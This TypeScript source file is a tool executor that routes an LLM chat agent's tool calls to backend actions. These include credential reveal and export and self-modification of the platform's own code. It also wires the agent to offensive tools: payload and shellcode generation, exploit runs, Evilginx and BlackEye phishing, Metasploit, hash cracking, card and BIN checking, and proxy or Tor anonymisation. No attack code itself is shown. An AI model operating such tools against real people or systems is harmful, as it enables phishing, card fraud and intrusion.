/**
 * Chat Tool Executor — Executes LLM tool calls against real backend data.
 *
 * Each function here maps a tool name to a real database query or action.
 * The executor receives the parsed arguments from the LLM and returns
 * a JSON-serializable result that gets fed back to the LLM as a tool response.
 */

import { getDb } from "./db";
import { storagePut } from "./storage";
import { chatConversations } from "../drizzle/schema";
import {
  fetcherJobs,
  fetcherTasks,
  fetcherCredentials,
  fetcherSettings,
  fetcherProxies,
  fetcherKillSwitch,
  apiKeys,
  teamMembers,
  users,
  credentialWatches,
  bulkSyncJobs,
  syncSchedules,
  leakScans,
  leakFindings,
  vaultItems,
  vaultAccessLog,
  providerHealthSnapshots,
  fetchRecommendations,
  auditLogs,
  builderActivityLog,
  sandboxFiles,
  marketplaceListings,
  sellerProfiles,
  userSecrets,
} from "../drizzle/schema";
import { eq, and, desc, isNull, sql, gte, like, or } from "drizzle-orm";
import { safeSqlIdentifier } from "./_core/sql-sanitize.js";
import { PROVIDERS } from "../shared/fetcher";
import {
  getDecryptedCredentials,
  exportCredentials as exportCredsDb,
  getCredentials,
  getJobs,
  getJob,
  getJobTasks,
  activateKillSwitch as activateKS,
  encrypt,
  decrypt,
  storeManualCredential,
} from "./fetcher-db";
import { getUserPlan, enforceFeature, enforceFetchLimit, enforceProviderAccess, canUseCloneWebsite, isFeatureAllowed } from "./subscription-gate";
import {
  readFile as selfReadFileImpl,
  listFiles as selfListFilesImpl,
  applyModifications,
  applyModificationsDeferred,
  runHealthCheck,
  runQuickHealthCheck,
  runTypeCheck,
  runTests,
  rollbackToSnapshot,
  rollbackToLastGood,
  saveCheckpoint,
  listCheckpoints,
  rollbackToCheckpoint,
  requestRestart,
  stageRestart,
  isDeferredMode,
  getModificationHistory,
  getProtectedFiles,
  getAllowedDirectories,
  validateModifications,
} from "./self-improvement-engine";
import { queryAuditLogs } from "./audit-log-db";
import { logAudit } from "./audit-log-db";
import { callDataApi } from "./_core/dataApi";
import crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import { execSync } from "child_process";
import {
  createSandbox,
  getSandbox,
  listSandboxes,
  executeCommand,
  updateEnvVars as sandboxUpdateEnvVars,
  listFiles as sandboxListFilesImpl,
  readFile as sandboxReadFileImpl,
  writeFile as sandboxWriteFileImpl,
} from "./sandbox-engine";
import {
  runPassiveWebScan,
  analyzeCodeSecurity,
  generateSecurityReport,
  runPortScan,
  checkSSL,
} from "./security-tools";
import {
  fixSingleVulnerability,
  fixAllVulnerabilities,
  generateFixReport,
} from "./auto-fix-engine";
import { invokeLLM } from "./_core/llm";
import { sandboxes } from "../drizzle/schema";
import { createLogger } from "./_core/logger.js";
import { getErrorMessage } from "./_core/errors.js";
import { validateToolCallNotSelfReplication } from "./anti-replication-guard";
import { runVaultBridge, getVaultBridgeStatus } from "./vault-bridge";
import { getAutonomousSystemStatus } from "./autonomous-sync";
import { getBusinessModuleGeneratorStatus, getBusinessVerticals, runBusinessModuleGenerationCycle } from "./business-module-generator";
import { checkCard, checkBin } from "./card-checker";
const log = createLogger("ChatExecutor");

// ─── Types ──────────────────────────────────────────────────────────

export interface ToolExecutionResult {
  success: boolean;
  data?: unknown;
  error?: string;
}

// ─── Main Executor ──────────────────────────────────────────────────

export async function executeToolCall(
  toolName: string,
  args: Record<string, unknown>,
  userId: number,
  userName?: string,
  userEmail?: string,
  userApiKey?: string | null
,
  conversationId?: number): Promise<ToolExecutionResult> {
  try {
    // ── Subscription Tier Gating ──────────────────────────────────
    // Premium tools accessed through AI chat must respect the same
    // tier restrictions as their direct API counterparts.
    const plan = await getUserPlan(userId);
    const planId = plan.planId;

    // Helper: return a friendly gating error instead of throwing
    const gateResult = (feature: string, label: string): ToolExecutionResult | null => {
      if (!isFeatureAllowed(planId, feature)) {
        return {
          success: false,
          error: `${label} is not available on the ${plan.tier.name} plan. Upgrade to unlock this feature at /pricing.`,
        };
      }
      return null;
    };

    // ── Anti-Self-Replication Guard ────────────────────────────
    // Block any tool call that attempts to clone, copy, or export
    // the Titan platform itself. Enforced at runtime.
    const replicationBlock = validateToolCallNotSelfReplication(toolName, args);
    if (replicationBlock) {
      log.warn(`SELF-REPLICATION BLOCKED: user=${userId} tool=${toolName}`, { args });
      return { success: false, error: replicationBlock };
    }

    switch (toolName) {
      // ── Credentials & Fetching ──────────────────────────────────
  
    // ─── Navigation ────────────────────────────────────────────────
    case "navigate_to_page": {
      const page = args.page as string;
      const reason = args.reason as string;
      if (!page) return { success: false, error: "Page path is required" };
      
      // Normalize the path
      const normalizedPath = page.startsWith("/") ? page : `/${page}`;
      
      // Validate against known pages
      const validPages = [
        // Core
        "/dashboard", "/dashboard/credits", "/dashboard/subscription",
        "/pricing", "/contact", "/sandbox", "/project-files",
        // Fetcher / Credential Management
        "/fetcher/new", "/fetcher/jobs", "/fetcher/credentials",
        "/fetcher/export", "/fetcher/import", "/fetcher/api-access",
        "/fetcher/smart-fetch", "/fetcher/cli",
        "/fetcher/watchdog", "/fetcher/provider-health", "/fetcher/health-trends",
        "/fetcher/credential-health",
        "/fetcher/leak-scanner", "/fetcher/bulk-sync", "/fetcher/auto-sync",
        "/fetcher/onboarding", "/fetcher/team", "/fetcher/team-vault",
        "/fetcher/totp-vault", "/fetcher/notifications",
        "/fetcher/history", "/fetcher/audit-logs", "/fetcher/developer-docs",
        "/fetcher/webhooks", "/fetcher/api-analytics", "/fetcher/account",
        "/fetcher/settings", "/fetcher/releases",
        "/fetcher/admin", "/fetcher/self-improvement",
        // Marketplace & Business
        "/marketplace", "/replicate", "/companies", "/business-plans",
        "/grants", "/grant-applications", "/crowdfunding",
        "/referrals", "/affiliate",
        // Marketing & Content
        "/blog", "/blog-admin", "/seo", "/marketing", "/advertising",
      ];
      
      if (!validPages.includes(normalizedPath)) {
        return { success: false, error: `Unknown page: ${page}. Valid pages: ${validPages.join(", ")}` };
      }
      
      return {
        success: true,
        data: {
          action: "navigate",
          path: normalizedPath,
          reason: reason || "Navigate to page",
          message: `Navigate to [${normalizedPath}](${normalizedPath}): ${reason || ""}`
        },
      };
    }

    // ─── Web Research ──────────────────────────────────────────────
    case "web_search": {
      const query = args.query as string;
      if (!query) return { success: false, error: "Search query is required" };

      const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      const stripTags = (s: string) => s.replace(/<[^>]*>/g, "").trim();

      // ── Helper: Parse Brave Search HTML ──
      const parseBrave = (html: string): Array<{ title: string; url: string; snippet: string }> => {
        const results: Array<{ title: string; url: string; snippet: string }> = [];
        // Brave wraps each result in <div class="snippet" data-pos="N" data-type="web">
        const parts = html.split(/data-pos="(\d+)"[^>]*data-type="web"/);
        for (let i = 1; i < parts.length && results.length < 8; i += 2) {
          const content = (parts[i + 1] || "").slice(0, 3000);
          const urlM = content.match(/<a[^>]*href="(https?:\/\/[^"]+)"/);
          const titleM = content.match(/class="title[^"]*"[^>]*title="([^"]+)"/);
          // Fallback title: text inside the title div
          const titleAlt = content.match(/class="title[^"]*"[^>]*>(.*?)<\/div>/s);
          const descM = content.match(/class="snippet-description[^"]*"[^>]*>(.*?)<\/div>/s);
          const url = urlM ? urlM[1] : "";
          const title = titleM ? titleM[1] : (titleAlt ? stripTags(titleAlt[1]) : "");
          const snippet = descM ? stripTags(descM[1]).slice(0, 200) : "";
          if (url && title) results.push({ title, url, snippet });
        }
        return results;
      };

      // ── Helper: Parse DuckDuckGo HTML ──
      const parseDDG = (html: string): Array<{ title: string; url: string; snippet: string }> => {
        const results: Array<{ title: string; url: string; snippet: string }> = [];
        const resultRegex = /<a[^>]*class="result__a"[^>]*href="([^"]*)"[^>]*>([\s\S]*?)<\/a>[\s\S]*?<a[^>]*class="result__snippet"[^>]*>([\s\S]*?)<\/a>/g;
        let match;
        while ((match = resultRegex.exec(html)) !== null && results.length < 8) {
          let url = match[1];
          const uddgMatch = url.match(/uddg=([^&]*)/);
          if (uddgMatch) url = decodeURIComponent(uddgMatch[1]);
          const title = stripTags(match[2]);
          const snippet = stripTags(match[3]);
          if (title && url) results.push({ title, url, snippet });
        }
        return results;
      };

      // ── Helper: Detect CAPTCHA / bot block ──
      const isCaptcha = (html: string): boolean =>
        /anomaly|captcha|challenge|unusual traffic|blocked|verify you are human/i.test(html.slice(0, 2000));

      try {
        let results: Array<{ title: string; url: string; snippet: string }> = [];
        let source = "brave";

        // PRIMARY: Brave Search (no CAPTCHA, reliable)
        try {
          const braveUrl = `https://search.brave.com/search?q=${encodeURIComponent(query)}`;
          const resp = await fetch(braveUrl, { headers: { "User-Agent": UA } });
          const html = await resp.text();
          if (!isCaptcha(html)) {
            results = parseBrave(html);
          }
        } catch (_braveErr) { /* Brave failed, try fallback */ }

        // FALLBACK: DuckDuckGo HTML (may CAPTCHA on some IPs)
        if (results.length === 0) {
          source = "duckduckgo";
          try {
            const ddgUrl = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
            const resp = await fetch(ddgUrl, { headers: { "User-Agent": UA } });
            const html = await resp.text();
            if (!isCaptcha(html)) {
              results = parseDDG(html);
            }
          } catch (_ddgErr) { /* DDG also failed */ }
        }

        if (results.length === 0) {
          return { success: true, data: { message: "No results found. Try a different search query.", query, source } };
        }
        return { success: true, data: { query, resultCount: results.length, results, source } };
      } catch (err: unknown) {
        return { success: false, error: `Search failed: ${getErrorMessage(err)}` };
      }
    }

    case "web_page_read": {
      const url = args.url as string;
      if (!url) return { success: false, error: "URL is required" };
      try {
        const resp = await fetch(url, {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          },
          signal: AbortSignal.timeout(15000),
        });
        if (!resp.ok) {
          return { success: false, error: `Failed to fetch page: ${resp.status} ${resp.statusText}` };
        }
        const html = await resp.text();
        // Extract title
        const titleMatch = html.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
        const title = titleMatch ? titleMatch[1].replace(/<[^>]*>/g, "").trim() : "Untitled";
        // Remove script, style, nav, header, footer tags
        let text = html
          .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
          .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
          .replace(/<nav[^>]*>[\s\S]*?<\/nav>/gi, "")
          .replace(/<header[^>]*>[\s\S]*?<\/header>/gi, "")
          .replace(/<footer[^>]*>[\s\S]*?<\/footer>/gi, "")
          .replace(/<[^>]*>/g, " ")
          .replace(/&nbsp;/g, " ")
          .replace(/&amp;/g, "&")
          .replace(/&lt;/g, "<")
          .replace(/&gt;/g, ">")
          .replace(/&quot;/g, '"')
          .replace(/&#39;/g, "'")
          .replace(/\s+/g, " ")
          .trim();
        // Truncate to ~4000 chars to fit in context
        if (text.length > 4000) {
          text = text.substring(0, 4000) + "... [truncated]";
        }
        return { success: true, data: { title, url, contentLength: text.length, content: text } };
      } catch (err: unknown) {
        return { success: false, error: `Failed to read page: ${getErrorMessage(err)}` };
      }
    }

    case "list_credentials":
        return await execListCredentials(userId);

      case "reveal_credential":
        return await execRevealCredential(userId, args.credentialId as number);

      case "export_credentials":
        return await execExportCredentials(userId, args.format as string);

      case "create_fetch_job":
        return await execCreateFetchJob(userId, args.providerIds as string[]);

      case "list_jobs":
        return await execListJobs(userId);

      case "get_job_details":
        return await execGetJobDetails(userId, args.jobId as number);

      case "list_providers":
        return execListProviders();

      // ── API Keys (Pro+) ──────────────────────────────────────────
      case "list_api_keys": {
        const gate = gateResult("api_access", "API Access");
        if (gate) return gate;
        return await execListApiKeys(userId);
      }

      case "create_api_key": {
        const gate = gateResult("api_access", "API Access");
        if (gate) return gate;
        return await execCreateApiKey(userId, args as any, userName, userEmail);
      }

      case "revoke_api_key": {
        const gate = gateResult("api_access", "API Access");
        if (gate) return gate;
        return await execRevokeApiKey(userId, args.keyId as number, userName, userEmail);
      }

      // ── Leak Scanner (Cyber+) ─────────────────────────────────
      case "start_leak_scan": {
        const gate = gateResult("leak_scanner", "Credential Leak Scanner");
        if (gate) return gate;
        return await execStartLeakScan(userId);
      }

      case "get_leak_scan_results": {
        const gate = gateResult("leak_scanner", "Credential Leak Scanner");
        if (gate) return gate;
        return await execGetLeakScanResults(userId);
      }

      // ── Vault ───────────────────────────────────────────────────
      case "list_vault_entries":
        return await execListVaultEntries(userId);

      case "add_vault_entry":
        return await execAddVaultEntry(userId, args as any, userName);

      // ── Save Credential (manual input via chat) ─────────────────
      case "save_credential":
        return await execSaveCredential(userId, args as any, userName, userEmail);

      // ── Bulk Sync (Pro+) ──────────────────────────────────────────
      case "trigger_bulk_sync": {
        const gate = gateResult("scheduled_fetches", "Bulk Sync");
        if (gate) return gate;
        return await execTriggerBulkSync(userId, args.providerIds as string[] | undefined);
      }

      case "get_bulk_sync_status": {
        const gate = gateResult("scheduled_fetches", "Bulk Sync");
        if (gate) return gate;
        return await execGetBulkSyncStatus(userId);
      }

      // ── Team (Enterprise+) ──────────────────────────────────────
      case "list_team_members": {
        const gate = gateResult("team_management", "Team Management");
        if (gate) return gate;
        return await execListTeamMembers(userId);
      }

      case "add_team_member": {
        const gate = gateResult("team_management", "Team Management");
        if (gate) return gate;
        return await execAddTeamMember(userId, args as any, userName, userEmail);
      }

      case "remove_team_member": {
        const gate = gateResult("team_management", "Team Management");
        if (gate) return gate;
        return await execRemoveTeamMember(userId, args.memberId as number, userName, userEmail);
      }

      case "update_team_member_role": {
        const gate = gateResult("team_management", "Team Management");
        if (gate) return gate;
        return await execUpdateTeamMemberRole(userId, args as any, userName, userEmail);
      }

      // ── Scheduler (Pro+) ──────────────────────────────────────────
      case "list_schedules": {
        const gate = gateResult("scheduled_fetches", "Scheduled Fetches");
        if (gate) return gate;
        return await execListSchedules(userId);
      }

      case "create_schedule": {
        const gate = gateResult("scheduled_fetches", "Scheduled Fetches");
        if (gate) return gate;
        return await execCreateSchedule(userId, args as any);
      }

      case "delete_schedule": {
        const gate = gateResult("scheduled_fetches", "Scheduled Fetches");
        if (gate) return gate;
        return await execDeleteSchedule(userId, args.scheduleId as number);
      }

      // ── Watchdog ────────────────────────────────────────────────
      case "get_watchdog_summary":
        return await execGetWatchdogSummary(userId);

      // ── Provider Health ─────────────────────────────────────────
      case "check_provider_health":
        return await execCheckProviderHealth(userId);

      // ── Recommendations ─────────────────────────────────────────
      case "get_recommendations":
        return await execGetRecommendations(userId);

      // ── Audit (Enterprise+) ────────────────────────────────────
      case "get_audit_logs": {
        const gate = gateResult("audit_logs", "Audit Logs");
        if (gate) return gate;
        return await execGetAuditLogs(args as any);
      }

      // ── Kill Switch — REMOVED (now a Grand Bazaar module)

      // ── System ──────────────────────────────────────────────────
      case "get_system_status":
        return await execGetSystemStatus(userId);

      case "get_plan_usage":
        return await execGetPlanUsage(userId);

      // ── Self-Improvement ────────────────────────────────────────
      case "self_read_file":
        return execSelfReadFile(args.filePath as string);

      case "self_list_files":
        return execSelfListFiles(args.dirPath as string);

      case "self_modify_file":
        return await execSelfModifyFile(userId, args as any, userName);

      case "self_health_check":
        return await execSelfHealthCheck({
          skipTests: args.skipTests as boolean | undefined,
          skipTypeCheck: args.skipTypeCheck as boolean | undefined,
        });

      case "self_rollback":
        return await execSelfRollback(userId, args.snapshotId as number | undefined, userName);

      case "self_restart":
        return await execSelfRestart(userId, args.reason as string);

      case "self_modification_history":
        return await execSelfModificationHistory(args.limit as number | undefined);

      case "self_get_protected_files":
        return execSelfGetProtectedFiles();

      // ── Builder Tools ──────────────────────────────────────────────
      case "self_type_check":
        return await execSelfTypeCheck(userId);
      case "self_run_tests":
        return await execSelfRunTests(args.testPattern as string | undefined, userId);
      case "self_multi_file_modify":
        return await execSelfMultiFileModify(userId, args.modifications as any[], userName);
      // ── Professional Builder Tools ──────────────────────────────────
      case "self_dependency_audit":
        return await execSelfDependencyAudit(args.focus as string | undefined);
      case "self_grep_codebase":
        return await execSelfGrepCodebase(args.pattern as string, args.filePattern as string | undefined, args.maxResults as number | undefined);
      case "self_git_diff":
        return await execSelfGitDiff(args.filePath as string | undefined, args.staged as boolean | undefined);
      case "self_env_check":
        return await execSelfEnvCheck();
      case "self_db_schema_inspect":
        return await execSelfDbSchemaInspect(args.table as string | undefined);
      case "self_code_stats":
        return await execSelfCodeStats(args.directory as string | undefined);
      case "self_deployment_check":
        return await execSelfDeploymentCheck(args.quick as boolean | undefined);
      // ── Checkpoint Tools ───────────────────────────────────────
      case "self_save_checkpoint":
        return await execSelfSaveCheckpoint(args.name as string, userId, userName);
      case "self_list_checkpoints":
        return await execSelfListCheckpoints(args.limit as number | undefined);
      case "self_rollback_to_checkpoint":
        return await execSelfRollbackToCheckpoint(args.checkpointId as number | undefined, userId, userName);
      case "self_analyze_file":
        return await execSelfAnalyzeFile(args.filePath as string);
      case "self_find_dead_code":
        return await execSelfFindDeadCode(args.directory as string | undefined);
      case "self_api_map":
        return await execSelfApiMap();
      // ── Sandbox Tools ────────────────────────────────────────────
      case "sandbox_exec":
        return await execSandboxCommand(userId, args);
      case "sandbox_write_file":
        return await execSandboxWriteFile(userId, args);
      case "sandbox_read_file":
        return await execSandboxReadFile(userId, args);
      case "sandbox_list_files":
        return await execSandboxListFiles(userId, args);

      // ── Security Tools (Cyber+) ──────────────────────────────────
      case "security_scan": {
        const gate = gateResult("security_tools", "Security Scan");
        if (gate) return gate;
        return await execSecurityScan(args);
      }
      case "code_security_review": {
        const gate = gateResult("security_tools", "Code Security Review");
        if (gate) return gate;
        return await execCodeSecurityReview(args);
      }
      case "port_scan": {
        const gate = gateResult("security_tools", "Port Scan");
        if (gate) return gate;
        return await execPortScan(args);
      }
      case "ssl_check": {
        const gate = gateResult("security_tools", "SSL Check");
        if (gate) return gate;
        return await execSSLCheck(args);
      }

      // ── Auto-Fix Tools (Cyber+) ─────────────────────────────────
      case "auto_fix_vulnerability": {
        const gate = gateResult("security_tools", "Auto-Fix Vulnerability");
        if (gate) return gate;
        return await execAutoFixVulnerability(args);
      }
      case "auto_fix_all_vulnerabilities": {
        const gate = gateResult("security_tools", "Auto-Fix All Vulnerabilities");
        if (gate) return gate;
        return await execAutoFixAll(args);
      }

      // ── App Research & Clone ───────────────────────────────────
      case "app_research":
        return await execAppResearch(args, userApiKey || undefined);
      case "app_clone":
        return await execAppClone(userId, args, userApiKey || undefined);
      case "website_replicate": {
        const hasAccess = await canUseCloneWebsite(userId);
        if (!hasAccess) {
          return {
            success: false,
            error: "Website Clone is an exclusive feature for Cyber+ and Titan subscribers. Upgrade at /pricing to unlock this capability.",
          };
        }
        return await execWebsiteReplicate(userId, args);
      }

      // ── Project Builder Tools ─────────────────────────────────
      case "create_file":
        return await execCreateFile(userId, args, conversationId);
      case "create_github_repo":
        return await execCreateGithubRepo(userId, args, conversationId);
      case "push_to_github":
        return await execPushToGithub(userId, args, conversationId);
      case "read_uploaded_file":
        return await execReadUploadedFile(args);
      case "provide_project_zip":
        return await execProvideProjectZip(userId, args);
      case "search_bazaar":
        return await execSearchBazaar(args);
      // ── Autonomous System Management ────────────────────────────────
      case "get_autonomous_status":
        return await execGetAutonomousStatus();
      case "get_channel_status":
        return await execGetChannelStatus();
      case "refresh_vault_bridge":
        return await execRefreshVaultBridge(args.force as boolean | undefined);
      case "get_vault_bridge_info":
        return await execGetVaultBridgeInfo();
      // ── Business Module Generator ────────────────────────────────────
      case "get_business_module_status":
        return await execGetBusinessModuleStatus();
      case "get_business_verticals":
        return await execGetBusinessVerticals();
      case "trigger_business_module_generation":
        return await execTriggerBusinessModuleGeneration();
      case "check_card":
        return await execCheckCard(args);
      case "check_bin":
        return await execCheckBin(args);
      // ── Advanced Security Tools ─────────────────────────────────────
      case "install_security_toolkit":
        return await execInstallSecurityToolkit(userId, args);
      case "network_scan":
        return await execNetworkScan(userId, args);
      case "generate_yara_rule":
        return await execGenerateYaraRule(userId, args);
      case "generate_sigma_rule":
        return await execGenerateSigmaRule(userId, args);
      case "hash_crack":
        return await execHashCrack(userId, args);
      case "generate_payload":
        return await execGeneratePayload(userId, args);
      case "osint_lookup":
        return await execOsintLookup(userId, args);
      case "cve_lookup":
        return await execCveLookup(userId, args);
      case "run_exploit":
        return await execRunExploit(userId, args);
      case "decompile_binary":
        return await execDecompileBinary(userId, args);
      case "fuzzer_run":
        return await execFuzzerRun(userId, args);
      // ── New Security Tools (#51-#62) ──────────────────────────────
      case "shellcode_gen":
        return await execShellcodeGen(userId, args);
      case "code_obfuscate":
        return await execCodeObfuscate(userId, args);
      case "privesc_check":
        return await execPrivescCheck(userId, args);
      case "web_attack":
        return await execWebAttack(userId, args);
      case "threat_intel_lookup":
        return await execThreatIntelLookup(userId, args);
      case "traffic_capture":
        return await execTrafficCapture(userId, args);
      case "ad_attack":
        return await execAdAttack(userId, args);
      case "cloud_enum":
        return await execCloudEnum(userId, args);
      case "generate_pentest_report":
        return await execGeneratePentestReport(userId, args);
      case "sandbox_delete_file":
        return await execSandboxDeleteFile(userId, args);
      case "sandbox_download_url":
        return await execSandboxDownloadUrl(userId, args);
      case "evilginx_connect":
        return await execEvilginxConnect(userId);
      case "evilginx_run_command":
        return await execEvilginxRunCommand(userId, args);
      case "evilginx_list_phishlets":
        return await execEvilginxRunCommand(userId, { command: "phishlets" });
      case "evilginx_list_sessions":
        return await execEvilginxRunCommand(userId, { command: "sessions" });
      case "evilginx_list_lures":
        return await execEvilginxRunCommand(userId, { command: "lures" });
      case "metasploit_test_connection":
        return await execMetasploitTestConnection(userId, args);
      case "metasploit_run_command":
        return await execMetasploitRunCommand(userId, args);
      case "metasploit_list_sessions":
        return await execMetasploitRunCommand(userId, { command: "sessions -l", timeout: 15000 });
      case "metasploit_search_modules":
        return await execMetasploitRunCommand(userId, { command: `search ${args.query}`, timeout: 30000 });
      case "argus_test_connection":
        return await execArgusTestConnection(userId, args);
      case "astra_test_connection":
        return await execAstraTestConnection(userId, args);
      case "blackeye_test_connection":
        return await execBlackeyeTestConnection(userId, args);
      case "blackeye_run_command":
        return await execBlackeyeRunCommand(userId, args);
      case "content_creator_get_campaigns":
        return await execContentCreatorGetCampaigns(userId, args);
      case "site_monitor_list_sites":
        return await execSiteMonitorListSites(userId);
      case "totp_vault_list":
        return await execTotpVaultList(userId);
      case "voice_transcribe":
        return await execVoiceTranscribe(userId, args);
      case "replicate_list_projects":
        return await execReplicateListProjects(userId);
      case "seo_get_health_score":
        return await execSeoGetHealthScore(userId);
      case "advertising_get_strategy":
        return await execAdvertisingGetStrategy(userId);
      case "affiliate_get_stats":
        return await execAffiliateGetStats(userId);
      case "grant_list":
        return await execGrantList(userId, args);
      case "storage_get_stats":
        return await execStorageGetStats(userId);
      case "storage_list_files":
        return await execStorageListFiles(userId, args);
      case "storage_get_download_url":
        return await execStorageGetDownloadUrl(userId, args);
      case "storage_delete_file":
        return await execStorageDeleteFile(userId, args);
      case "storage_upload_file":
        return await execStorageUploadFile(userId, args);
      case "marketplace_browse":
        return await execMarketplaceBrowse(userId, args);
      case "cybermcp_test_basic_auth":
        return await execCybermcpTestBasicAuth(userId, args);
      // Memory management
      case "memory_list_facts":
        return await execMemoryListFacts(userId);
      case "memory_save_fact":
        return await execMemorySaveFact(userId, args);
      case "memory_delete_fact":
        return await execMemoryDeleteFact(userId, args);

      // ── Tor Browser ──────────────────────────────────────────────
      case "tor_get_status":
        return await execTorGetStatus(userId);
      case "tor_new_circuit":
        return await execTorNewCircuit(userId);
      case "tor_install":
        return await execTorInstall(userId, args);
      case "tor_set_active":
        return await execTorSetActive(userId, args);
      case "tor_set_firewall":
        return await execTorSetFirewall(userId, args);

      // ── VPN Chain ─────────────────────────────────────────────────
      case "vpn_chain_get_chain":
        return await execVpnChainGetChain(userId);
      case "vpn_chain_add_hop":
        return await execVpnChainAddHop(userId, args);
      case "vpn_chain_test_chain":
        return await execVpnChainTestChain(userId);
      case "vpn_chain_set_active":
        return await execVpnChainSetActive(userId, args);

      // ── Proxy Maker ───────────────────────────────────────────────
      case "proxy_maker_get_pool":
        return await execProxyMakerGetPool(userId);
      case "proxy_maker_scrape_proxies":
        return await execProxyMakerScrapeProxies(userId, args);
      case "proxy_maker_health_check":
        return await execProxyMakerHealthCheck(userId);
      case "proxy_maker_set_rotation":
        return await execProxyMakerSetRotation(userId, args);
      case "proxy_maker_deploy_proxy":
        return await execProxyMakerDeployProxy(userId, args);

      // ── BIN Checker ───────────────────────────────────────────────
      case "bin_lookup":
        return await execBinLookup(userId, args);
      case "card_validate":
        return await execCardValidate(userId, args);
      case "bin_reverse_lookup":
        return await execBinReverseLookup(userId, args);

      default:
        return { success: false, error: `Unknown tool: ${toolName}` };
    }
  } catch (err: unknown) {
    log.error(`[ChatExecutor] Error executing ${toolName}:`, { error: String(err) });
    return {
      success: false,
      error: getErrorMessage(err) || `Failed to execute ${toolName}`,
    };
  }
}

// ─── Implementation Functions ────────────────────────────────────────

async function execListCredentials(userId: number): Promise<ToolExecutionResult> {
  const creds = await getCredentials(userId);
  return {
    success: true,
    data: {
      count: creds.length,
      credentials: creds.map((c: any) => ({
        id: c.id,
        provider: c.providerName || c.providerId,
        providerId: c.providerId,
        keyType: c.keyType,
        label: c.keyLabel || "—",
        createdAt: c.createdAt,
      })),
    },
  };
}

async function execRevealCredential(userId: number, credentialId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const rows = await db
    .select()
    .from(fetcherCredentials)
    .where(and(eq(fetcherCredentials.id, credentialId), eq(fetcherCredentials.userId, userId)))
    .limit(1);

  if (rows.length === 0) {
    return { success: false, error: "Credential not found or access denied" };
  }

  const cred = rows[0];
  let value: string;
  try {
    value = decrypt(cred.encryptedValue);
  } catch {
    value = "[decryption failed]";
  }

  return {
    success: true,
    data: {
      id: cred.id,
      provider: cred.providerName,
      keyType: cred.keyType,
      label: cred.keyLabel,
      value,
    },
  };
}

async function execExportCredentials(userId: number, format: string): Promise<ToolExecutionResult> {
  if (!["json", "env", "csv"].includes(format)) {
    return { success: false, error: "Invalid format. Use: json, env, or csv" };
  }
  const data = await exportCredsDb(userId, format as "json" | "env" | "csv");
  return { success: true, data: { format, content: data } };
}

async function execCreateFetchJob(userId: number, providerIds: string[]): Promise<ToolExecutionResult> {
  if (!providerIds || providerIds.length === 0) {
    return { success: false, error: "No providers specified. Use list_providers to see available options." };
  }

  // Validate provider IDs
  const invalid = providerIds.filter((id) => !PROVIDERS[id]);
  if (invalid.length > 0) {
    return { success: false, error: `Unknown provider IDs: ${invalid.join(", ")}. Use list_providers to see valid IDs.` };
  }

  // Note: actual job creation requires email/password for the provider portals.
  // The chat assistant can't collect those securely, so we return guidance.
  return {
    success: true,
    data: {
      message: `To create a fetch job for ${providerIds.length} provider(s) (${providerIds.join(", ")}), please use the Fetcher page in the dashboard. The fetch process requires your provider login credentials which must be entered securely through the UI.`,
      providers: providerIds.map((id) => ({
        id,
        name: PROVIDERS[id]?.name || id,
        url: PROVIDERS[id]?.loginUrl || "",
      })),
      tip: "Navigate to Dashboard → Fetcher → New Fetch to start a job.",
    },
  };
}

async function execListJobs(userId: number): Promise<ToolExecutionResult> {
  const jobs = await getJobs(userId);
  return {
    success: true,
    data: {
      count: jobs.length,
      jobs: jobs.slice(0, 10).map((j: any) => ({
        id: j.id,
        status: j.status,
        completedProviders: j.completedProviders,
        totalProviders: j.totalProviders,
        failedProviders: j.failedProviders,
        completedAt: j.completedAt,
        createdAt: j.createdAt,
      })),
    },
  };
}

async function execGetJobDetails(userId: number, jobId: number): Promise<ToolExecutionResult> {
  const job = await getJob(jobId, userId);
  if (!job) return { success: false, error: "Job not found" };

  const tasks = await getJobTasks(jobId);
  return {
    success: true,
    data: {
      job: {
        id: job.id,
        status: job.status,
        completedProviders: job.completedProviders,
        totalProviders: job.totalProviders,
        failedProviders: job.failedProviders,
        completedAt: job.completedAt,
        createdAt: job.createdAt,
      },
      tasks: tasks.map((t: any) => ({
        id: t.id,
        providerId: t.providerId,
        status: t.status,
        message: t.message,
      })),
    },
  };
}

function execListProviders(): ToolExecutionResult {
  const providers = Object.values(PROVIDERS).map((p) => ({
    id: p.id,
    name: p.name,
    category: p.category,
    keyTypes: p.keyTypes,
    description: p.description,
    requiresProxy: p.requiresResidentialProxy,
  }));
  return { success: true, data: { count: providers.length, providers } };
}

async function execListApiKeys(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const keys = await db
    .select({
      id: apiKeys.id,
      name: apiKeys.name,
      keyPrefix: apiKeys.keyPrefix,
      scopes: apiKeys.scopes,
      lastUsedAt: apiKeys.lastUsedAt,
      usageCount: apiKeys.usageCount,
      expiresAt: apiKeys.expiresAt,
      revokedAt: apiKeys.revokedAt,
      createdAt: apiKeys.createdAt,
    })
    .from(apiKeys)
    .where(eq(apiKeys.userId, userId))
    .orderBy(desc(apiKeys.createdAt));

  return {
    success: true,
    data: {
      count: keys.length,
      activeCount: keys.filter((k) => !k.revokedAt).length,
      keys: keys.map((k) => ({
        ...k,
        status: k.revokedAt ? "revoked" : k.expiresAt && k.expiresAt < new Date() ? "expired" : "active",
      })),
    },
  };
}

async function execCreateApiKey(
  userId: number,
  args: { name: string; scopes: string[]; expiresInDays?: number },
  userName?: string,
  userEmail?: string
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  // Check active key count
  const activeCount = await db
    .select({ count: sql<number>`COUNT(*)` })
    .from(apiKeys)
    .where(and(eq(apiKeys.userId, userId), isNull(apiKeys.revokedAt)));

  if (activeCount[0].count >= 10) {
